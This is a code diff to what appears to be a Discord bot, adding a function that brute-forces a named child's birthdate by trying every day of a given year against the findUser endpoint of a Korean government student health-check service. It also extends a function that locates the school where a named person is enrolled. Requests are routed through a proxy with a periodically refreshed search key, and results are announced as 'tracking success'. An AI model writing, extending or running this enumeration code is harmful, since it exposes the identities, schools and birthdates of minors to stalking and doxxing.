@@ -170,8 +170,14 @@ async function findSchool(name, birthday, region, special = false, interaction =
                     result.orgCode = org.code;
                     result.scCode = codes[org.region];
                     result.region = org.region;
+                    result.birthday = {
+                        text: `${Number(birthday[0]) + 2000}년 ${birthday[1]}월 ${birthday[2]}일`,
+                        year: Number(birthday[0]) + 2000,
+                        month: birthday[1],
+                        day: birthday[2]
+                    };
                     s.push(result);
-                    interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 트래킹 성공 (페이지 ${currentPage}/${orgList.length})`).setDescription(description += `\n**\`${result.region} ${result.orgName}\`**에서 **\`${name}\`**님의 정보를 찾았습니다! (소요된 시간: ${((Date.now() - startedTime) / 1000).toFixed(3)}초)`)] });
+                    interaction && interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 트래킹 성공 (페이지 ${currentPage}/${orgList.length})`).setDescription(description += `\n**\`${result.region} ${result.orgName}\`**에서 **\`${name}\`**님의 정보를 찾았습니다! (소요된 시간: ${((Date.now() - startedTime) / 1000).toFixed(3)}초)`)] });
                 };
             }));
         };
@@ -220,10 +226,11 @@ client.on('interactionCreate', async interaction => {
     const command = client.commands.get(interaction.commandName);
     if (!command) return interaction.reply({ content: `Command \`${interaction.commandName}\` not found.`, ephemeral: true });
     try {
+        if (!config.owners.includes(interaction.user.id) && !config.allowedUsers.includes(interaction.user.id)) return interaction.reply({ embeds: [new MessageEmbed().setTitle("❌ Missing Permission").setDescription("You don't have permission to use this command.").setColor("RED")], ephemeral: true });
         await command.execute(interaction, client);
     } catch (error) {
         console.error(error);
-        await interaction.reply({ content: 'There was an error while executing this command!', ephemeral: true });
+        await interaction[interaction.replied ? "editReply" : "reply"]({ content: 'There was an error while executing this command!', ephemeral: true });
     };
 });
 
@@ -248,6 +255,70 @@ async function sendValidatePassword(token, code) { //잠시 보류
         return res.data;
     } catch {
         return false;
+    };
+};
+
+global.getBirthdate = getBirthdate;
+async function getBirthdate(name, birthYear, school, interaction = null) {
+    let searchKeyInterval;
+    try {
+        if ((!name || name.length < 2 || name.length > 4 || /[^가-힣]/.test(name) || config.blockedNames.includes(name))) throw new Error("이름을 다시 확인해 주세요");
+        if (Number(birthYear) < 04 || Number(birthYear) > 15) throw new Error("출생연도를 다시 확인해 주세요");
+        let schoolList = schools.filter(x => (x.level == (Number(birthYear) <= 15 && Number(birthYear) >= 10 ? "초" : Number(birthYear) <= 09 && Number(birthYear) >= 07 ? "중" : "고") || x.level == "특수") && x.code == school);
+        birthYear = birthYear.length <= 1 ? `0${birthYear}` : birthYear;
+        if (schoolList.length < 1) throw new Error("학교를 다시 확인해 주세요");
+        school = schoolList[0];
+        let searchKey = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EB%B3%B4%EC%95%88%EC%A2%86%EB%B3%91%EC%8B%A0&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 5000 }).then(res => res.data.key).catch(e => "");
+        if (!searchKey) throw new Error("서버에 이상이 있습니다. 잠시 후 다시 시도해 주세요.");
+        searchKeyInterval = setInterval(async () => {
+            let res = await axios.get("https://hcs.eduro.go.kr/v2/searchSchool?lctnScCode=--&schulCrseScCode=hcs%EB%B3%B4%EC%95%88%EC%A2%86%EB%B3%91%EC%8B%A0&orgName=%ED%95%99&loginType=school", { proxy, headers, timeout: 5000 }).then(res => res.data.key).catch(e => "");
+            if (!!res) searchKey = res;
+        }, 90000); // hcs 서치 키 만료 시간: 2분
+        let description = "";
+        let startedTime = Date.now();
+        let data = [];
+        const monthDays = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
+        let currentPage = 0;
+        for (let month = 0; month < monthDays.length; month++) {
+            let array = new Array(monthDays[month]).fill(0, 0, monthDays[month]);
+            for (let j = 0; j < monthDays[month]; j++) array[j] = j + 1;
+            currentPage++;
+            if (interaction) {
+                if (data.length >= 1) interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 성공 (페이지 ${currentPage}/${monthDays.length})`).setDescription(description)] });
+                else interaction.editReply({ embeds: [new MessageEmbed().setColor("BLUE").setTitle(`🔍 검색 중... (페이지 ${currentPage}/${monthDays.length})`)] });
+            };
+            await Promise.all(array.map(async day => {
+                let result = await axios.post(`https://${codes[school.region]}hcs.eduro.go.kr/v2/findUser`, {
+                    "orgCode": school.code,
+                    "name": encrypt(name),
+                    "birthday": encrypt(`${birthYear}${month < 9 ? "0" : ""}${month + 1}${day < 10 ? "0" : ""}${day}`),
+                    "stdntPNo": null,
+                    "loginType": "school",
+                    searchKey
+                }, { proxy, headers, timeout: 10000 }).catch(err => { return err.response ? err.response : { status: "error", err } });
+                // result.status == "error" && console.log(result.err);
+                result = result && result.data;
+                if (!!result && !!result.orgName) {
+                    result.birthday = {
+                        text: `${Number(birthYear) + 2000}년 ${month + 1}월 ${day}일`,
+                        year: Number(birthYear) + 2000,
+                        month: month + 1,
+                        day: day
+                    };
+                    data.push(result);
+                    interaction && interaction.editReply({ embeds: [new MessageEmbed().setColor("GREEN").setTitle(`✅ 트래킹 성공 (페이지 ${currentPage}/${monthDays.length})`).setDescription(description += `\n**\`${birthYear}년 ${month + 1}월 ${day}일\`** (소요된 시간: ${((Date.now() - startedTime) / 1000).toFixed(3)}초)`)] });
+                };
+            }));
+        };
+        if (!data.length > 1) throw new Error("정보를 찾을 수 없습니다.");
+        return {
+            success: true,
+            data
+        };
+    } catch (e) {
+        return { success: false, message: e.message };
+    } finally {
+        clearInterval(searchKeyInterval);
     };
 };
 
